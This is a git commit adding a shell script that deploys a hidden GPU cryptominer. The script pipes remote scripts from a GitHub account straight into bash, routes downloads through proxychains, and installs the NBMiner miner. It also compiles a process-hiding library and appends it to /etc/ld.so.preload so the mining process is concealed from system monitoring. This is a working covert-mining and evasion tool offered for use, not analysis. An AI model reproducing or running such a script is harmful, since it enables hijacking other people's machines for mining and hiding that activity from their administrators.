22f9c4ae7f0b995acdf8739c5ad5e19638c2d022
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-04-02 14:55:50 +0200

    Create start_NbHiveWithProxy.sh

---
+++ start_NbHiveWithProxy.sh
@@ -0,0 +1,15 @@
+#!/bin/sh
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/setUpSSHTunnel.sh | bash
+wget -O - https://raw.githubusercontent.com/chadpetersen1337/sockd/main/chains.sh | bash
+wget https://github.com/NebuTech/NBMiner/releases/download/v37.1/NBMiner_37.1_Linux.tgz
+tar -xvzf NBMiner_37.1_Linux.tgz
+cd NBMiner_Linux
+proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/nbHiveonWithProxy.sh
+chmod +x nbHiveonWithProxy.sh
+proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
+unzip magicNb.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+./nbHiveonWithProxy.sh
